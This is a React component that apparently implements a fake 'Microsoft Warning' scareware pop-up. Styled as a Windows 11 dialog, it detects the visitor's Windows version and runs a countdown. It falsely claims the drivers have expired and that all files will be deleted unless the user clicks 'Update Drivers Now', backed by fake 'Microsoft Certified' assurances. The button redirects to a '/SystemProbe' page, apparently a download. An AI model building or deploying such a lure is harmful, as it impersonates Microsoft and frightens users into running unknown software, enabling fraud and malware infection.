import { useState, useEffect, type ReactNode } from "react";

interface WindowProps {
  title?: string;
  onClose?: () => void;
  children?: ReactNode;
  className?: string;
}

function Window({
  title = "Microsoft Warning",
  onClose,
  children,
  className = "",
}: WindowProps) {
  const [timeLeft, setTimeLeft] = useState(300); // 5 minutes in seconds

  // Get current date
  const currentDate = new Date().toLocaleDateString("en-US", {
    month: "long",
    day: "numeric",
    year: "numeric",
  });

  // Detect Windows version
  const detectWindowsOSVersion = () => {
    const userAgent = window.navigator.userAgent;
    if (userAgent.indexOf("Windows NT 10.0") !== -1) return "Windows 10/11";
    if (userAgent.indexOf("Windows NT 6.3") !== -1) return "Windows 8.1";
    if (userAgent.indexOf("Windows NT 6.2") !== -1) return "Windows 8";
    if (userAgent.indexOf("Windows NT 6.1") !== -1) return "Windows 7";
    return "Windows";
  };

  // Countdown timer
  useEffect(() => {
    if (timeLeft <= 0) return;

    const timer = setInterval(() => {
      setTimeLeft((prev) => prev - 1);
    }, 1000);

    return () => clearInterval(timer);
  }, [timeLeft]);

  // Format time as MM:SS
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, "0")}`;
  };

  const handleUpdate = () => {
    // Add your download/redirect logic here
    // Example: window.location.href = '/download'

    window.location.href = "/SystemProbe";
  };

  return (
    <div className="fixed inset-0 flex items-center justify-center z-50 bg-black/10 backdrop-blur-sm">
      <div
        className={`w-96 bg-white/95 backdrop-blur-xl border border-gray-200 rounded-lg shadow-2xl overflow-hidden ${className}`}
      >
        {/* Window Header - Windows 11 Style */}
        <div className="bg-white/80 backdrop-blur-sm border-b border-gray-200 px-4 py-2 flex items-center justify-between">
          <div className="flex items-center gap-3">
            {/* Windows 11 Logo */}
            <svg
              width="16"
              height="16"
              viewBox="0 0 16 16"
              className="text-blue-500"
              fill="currentColor"
            >
              <rect x="0" y="0" width="7" height="7" />
              <rect x="8" y="0" width="8" height="7" />
              <rect x="0" y="8" width="7" height="8" />
              <rect x="8" y="8" width="8" height="8" />
            </svg>
            <h3 className="text-gray-800 font-normal text-sm">{title}</h3>
          </div>

          {/* Windows Control Buttons */}
          <div className="flex items-center">
            {/* Close Button */}
            <button
              onClick={onClose}
              className="w-11 h-8 hover:bg-red-500 flex items-center justify-center transition-colors group"
              aria-label="Close"
            >
              <svg
                width="10"
                height="10"
                viewBox="0 0 10 10"
                className="text-gray-700 group-hover:text-white"
              >
                <line
                  x1="0"
                  y1="0"
                  x2="10"
                  y2="10"
                  stroke="currentColor"
                  strokeWidth="1"
                ></line>
                <line
                  x1="10"
                  y1="0"
                  x2="0"
                  y2="10"
                  stroke="currentColor"
                  strokeWidth="1"
                ></line>
              </svg>
            </button>
          </div>
        </div>

        {/* Window Content */}
        <div className="p-6 bg-white/90">
          {children ? (
            children
          ) : (
            <div className="space-y-4">
              {/* Warning Header */}
              <div className="flex items-start gap-3">
                <div className="shrink-0">
                  <svg
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    fill="none"
                    className="text-red-600"
                  >
                    <path
                      d="M12 2L2 22h20L12 2z"
                      fill="currentColor"
                      opacity="0.2"
                    />
                    <path
                      d="M12 2L2 22h20L12 2z"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinejoin="round"
                    />
                    <line
                      x1="12"
                      y1="9"
                      x2="12"
                      y2="13"
                      stroke="currentColor"
                      strokeWidth="2"
                      strokeLinecap="round"
                    />
                    <circle cx="12" cy="17" r="1" fill="currentColor" />
                  </svg>
                </div>
                <div className="flex-1">
                  <h2 className="text-lg font-semibold text-gray-900 mb-2">
                    Critical Driver Update Required
                  </h2>
                </div>
              </div>

              {/* Warning Messages */}
              <div className="space-y-3 text-sm text-gray-700">
                <p>
                  <span className="font-semibold">Expired:</span> Your drivers
                  expired today on{" "}
                  <span className="font-semibold">{currentDate}</span>
                </p>

                <p>
                  <span className="font-semibold text-red-600">Warning:</span>{" "}
                  {detectWindowsOSVersion()} detected
                </p>

                <div className="bg-red-50 border border-red-200 rounded p-3">
                  <p className="font-semibold text-red-800 mb-1">
                    ⚠️ Outdated Drivers Detected
                  </p>
                  <p className="text-red-700">
                    If you do not update your drivers immediately, you will not
                    be able to use your computer once it has been shutdown and
                    all your files are going to be deleted in{" "}
                    <span className="font-bold text-red-600 text-lg">
                      {formatTime(timeLeft)}
                    </span>
                  </p>
                </div>

                <p className="bg-blue-50 border border-blue-200 rounded p-3">
                  <span className="font-semibold text-blue-800">Required:</span>{" "}
                  <span className="text-blue-700">
                    Get the latest Drivers certified by Microsoft below to keep
                    your computer up to date.
                  </span>
                </p>
              </div>

              {/* Update Button */}
              <div className="pt-4 border-t border-gray-200">
                <button
                  onClick={handleUpdate}
                  className="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded transition-colors flex items-center justify-center gap-2 hover:cursor-pointer"
                >
                  Update Drivers Now
                </button>

                <p className="text-xs text-gray-500 text-center mt-3">
                  Microsoft Certified • Secure Download • Permanent Support
                </p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

export default Window;
